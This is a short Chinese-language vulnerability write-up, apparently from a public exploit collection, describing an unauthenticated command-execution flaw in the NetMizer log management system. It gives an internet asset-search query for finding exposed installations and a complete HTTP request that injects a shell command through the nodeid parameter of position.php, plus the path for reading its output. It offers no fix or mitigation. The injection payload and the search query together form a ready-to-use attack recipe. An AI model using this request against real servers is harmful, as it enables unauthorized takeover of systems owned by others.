# NetMizer 日志管理系统存在前台RCE漏洞

### 一、漏洞描述
NetMizer 日志管理系统position.php、接口处存在命令执行漏洞，未经身份验证的攻击者可通过该漏洞在服务器端任意执行命令，写入后门，获取服务器权限，进而控制整个web服务器。

### 二、影响版本
<font style="color:#000000;">NetMizer</font>

### 三、资产测绘
```plain
title="NetMizer 日志管理系统"
```

![1720677624454-6b76b40a-5923-426e-9d81-63dd9d76617b.png](./img/pcBac11H3i8YpRlr/1720677624454-6b76b40a-5923-426e-9d81-63dd9d76617b-738320.png)

### 四、漏洞复现
```plain
GET /data/search/position.php?action=file&nodeid=|id%3E1.txt HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:122.0) Gecko/20100101 Firefox/122.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Connection: close
Upgrade-Insecure-Requests: 1
```

![1720677595198-3656affb-0930-41f2-8854-b61e681505a3.png](./img/pcBac11H3i8YpRlr/1720677595198-3656affb-0930-41f2-8854-b61e681505a3-704021.png)

```plain
/data/search/1.txt
```

![1720677700435-c746a0b6-51d4-47fc-921f-3cd022ba8826.png](./img/pcBac11H3i8YpRlr/1720677700435-c746a0b6-51d4-47fc-921f-3cd022ba8826-191347.png)



> 更新: 2024-08-12 17:48:54  
> 原文: <https://www.yuque.com/xiaokp7/ocvun2/uwvvawaszmhd1b0w>